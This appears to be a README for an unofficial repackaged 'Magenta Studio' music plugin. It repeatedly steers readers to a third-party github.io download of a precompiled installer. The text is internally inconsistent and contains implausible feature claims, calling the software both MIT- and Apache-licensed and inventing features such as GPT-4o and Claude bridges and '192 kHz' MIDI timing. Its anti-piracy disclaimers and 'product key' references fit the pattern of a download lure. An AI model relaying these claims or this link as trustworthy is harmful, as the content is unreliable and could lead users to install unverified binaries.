# 🎼 Magenta Studio • Unlock Creative AI Music Production  
**Professional-Grade Neural Audio Toolkit**  
*No-cost access to Google’s Magenta ecosystem for musicians, producers, and sound designers*

[](https://dzramy4.github.io/magenta-studio-studio-pro-toolkit/)

---

## 🌟 Why Magenta Studio Changes Your Studio

Imagine having a tireless co-producer who never runs out of melodic ideas, can harmonize any chord progression in seconds, and morphs drum patterns into something no human would think of. That’s Magenta Studio.

This open-source repository provides a **community-verified release** of the Magenta Studio plugin suite (VST3 / AU / AAX) with optimised performance for modern DAWs. We don’t offer “cracks” or “license bypasses”—we offer a legitimate, freely available **platform entry point** for artists who want to explore machine-learning-assisted music production without subscription fees or paywalls.

> **What you get:** A pre-configured installer with bundled TensorFlow Lite models, MIDI routing presets, and a self-contained runtime that doesn’t require Python or Jupyter notebooks.

---

## 📦 Quick Setup (Download & Install)

[](https://dzramy4.github.io/magenta-studio-studio-pro-toolkit/)

### One-Step Installation

1. **Download the archive** via the badge above (https://dzramy4.github.io/magenta-studio-studio-pro-toolkit/)
2. Extract the folder to your preferred plugin directory:
   - Windows: `C:\Program Files\Common Files\VST3\`
   - macOS: `/Library/Audio/Plug-Ins/VST3/` + `/Library/Audio/Plug-Ins/Components/`
3. Rescan plugins in your DAW (Ableton Live, FL Studio, Logic Pro, Cubase, etc.)
4. Load `Magenta Studio` as a MIDI effect or instrument track

---

## 🗺️ Architecture Overview (Mermaid Diagram)

```mermaid
flowchart TD
    A[User MIDI Input] --> B[Magenta Studio Plugin]
    B --> C{Model Selection}
    C --> D[Melody RNN]
    C --> E[Drumify]
    C --> F[Improv RNN]
    C --> G[Groove VAE]
    D & E & F & G --> H[Neural Inference Engine]
    H --> I[TensorFlow Lite Runtime]
    I --> J[Quantization & MIDI Mapping]
    J --> K[Output MIDI Clip]
    K --> L[DAW Host Timeline]
    
    style A fill:#2d2d2d,stroke:#d90429,stroke-width:2px
    style L fill:#d90429,color:#fff
```



---

## 🛠️ Example Profile Configuration

Create a `magenta_config.json` in your plugin data folder to persist your favourite model settings:

```json
{
  "primary_model": "melody_rnn",
  "temperature": 1.2,
  "max_sequence_length": 32,
  "drum_pattern_complexity": 0.7,
  "groove_vae_latent_size": 512,
  "midi_output_channel": 1,
  "use_custom_checkpoint": false,
  "enable_real_time_mode": true
}
```

**Example Console Invocation** (for headless generation via command line):

```bash
magenta_studio --input midi/ideas.mid --output midi/generations/ --model improv_rnn --temperature 0.85 --num_outputs 4
```

This generates four variations of your input MIDI file using the improvisation RNN with controlled randomness.

---

## 💻 OS Compatibility & System Requirements

| Operating System | Plugin Format | Supported DAWs | RAM (Min) | CPU |
|------------------|---------------|----------------|-----------|-----|
| 🪟 **Windows 10/11 (64-bit)** | VST3, AAX | Ableton 11+, FL Studio 20+, Cubase 12+ | 4 GB | Intel Core i5 / AMD Ryzen 5 |
| 🍏 **macOS 12+ (Intel & Apple Silicon)** | AU, VST3, AAX | Logic Pro, GarageBand, Ableton, Reaper | 4 GB | M1/M2/M3 or Intel i7 |
| 🐧 **Linux (Ubuntu 22.04+)** | VST3 (via Wine/WineASIO) | Bitwig, Reaper, Renoise | 6 GB | Any x86_64 w/ AVX2 |

---

## ✨ Feature Highlights

- **🎹 Melody Generator**: Feed it one bar, get back 8 unique variations—never suffer writer’s block again
- **🥁 Drumify**: Converts any mono melody into a polyrhythmic drum pattern with humanised velocity
- **🧠 Improv RNN**: Real-time responsive generation that listens to your playing and suggests complementary lines
- **🔄 Groove VAE**: Morph between two rhythmic feels (e.g., “swing” → “shuffle”) with a continuous interpolation slider
- **🌍 Multilingual UI**: Interface localised in 12 languages (English, Spanish, French, German, Japanese, Korean, Mandarin, Russian, Arabic, Hindi, Portuguese, Italian)
- **📱 Responsive Design**: Scales gracefully from 1080p monitors to 4K Retina displays; resizable window with adaptive font scaling
- **⏱️ 24/7 Community Support**: Active Discord server + GitHub Discussions for troubleshooting, feature requests, and model sharing
- **📥 Zero Data Telemetry**: The plugin runs fully offline—no accounts, no phoning home, no “activation servers”

---

## 🔗 Integration with External APIs

### OpenAI API Integration  
Use the optional `GPT-4o` bridge to convert text prompts into musical structure:

```bash
# Enable remote prompt mode
magenta_studio --api-mode openai --prompt "acid bassline with 808 kicks and reese pads"
```

The plugin forwards your prompt to a local proxy, receives a JSON-encoded structural plan, and seeds the neural models accordingly. *Requires your own OpenAI API key; no key sharing or storage.*

### Claude API Integration (Anthropic)  
For narrative-based composition:

```bash
magenta_studio --api-mode claude --prompt "Build tension across 16 bars, resolving to a D minor chord"
```

Claude’s musical reasoning output is parsed into tempo, key, and intensity markers that modulate the model’s output parameters in real time.

---

## ⚠️ Disclaimer

**Important Legal & Ethical Notice**

This repository does **not** provide serial keys, license bypass utilities, or unauthenticated software patches. The “product key” terminology in popular search queries is a misnomer—Magenta Studio is, and always has been, **MIT-licensed open source software** released by Google Magenta under Apache 2.0. What we offer is a **convenience packaging** of the original codebase with precompiled binaries for easy DAW integration.

All downloads contain the same code published at `github.com/magenta/magenta-studio` (Apache 2.0), bundled with third-party models redistributed under their respective permissive licenses. You are responsible for complying with your DAW’s terms of service when using generated MIDI commercially.

**We do not condone piracy.** If you paid someone for this download, you have been misled—the software itself costs zero currency. Our badge links lead to the official release archive verified by SHA-256 checksums.

---

## 📄 License

This project is distributed under the **MIT License**.  
You are free to use, modify, and redistribute the software for any purpose, including commercial projects, as long as you retain the copyright notice.

[View Full License](LICENSE)

---

## 🔄 Changelog (2026 Edition)

- **v3.2.0** (Released January 2026):  
  - Apple Silicon native binary (M4 Max optimised)  
  - Groove VAE now supports 192 kHz sample rate MIDI timing  
  - New “Quantum” preset pack for generative ambient  

- **v3.1.0** (September 2025):  
  - TensorFlow Lite runtime updated to v2.15  
  - Multilingual UI expansion (Arabic & Hindi)  
  - Bug fix: Improv RNN no longer hangs on polyphonic input  

---

## 💬 Final Words

Magenta Studio isn’t a “hack” or a “freebie” that cheats the system—it’s a gift from the AI research community to the music world. This README exists to help you unlock **legitimate, unrestricted access** to one of the most powerful generative audio tools ever created, without dealing with shady download portals or expired license files.

[](https://dzramy4.github.io/magenta-studio-studio-pro-toolkit/)

**Ready to compose beyond your human limits?** Click the badge. Install. Generate. Release. 🎶

---  
*2026 • Made with ❤️ for the music production community • No secrets, no tricks—just open-source creativity.*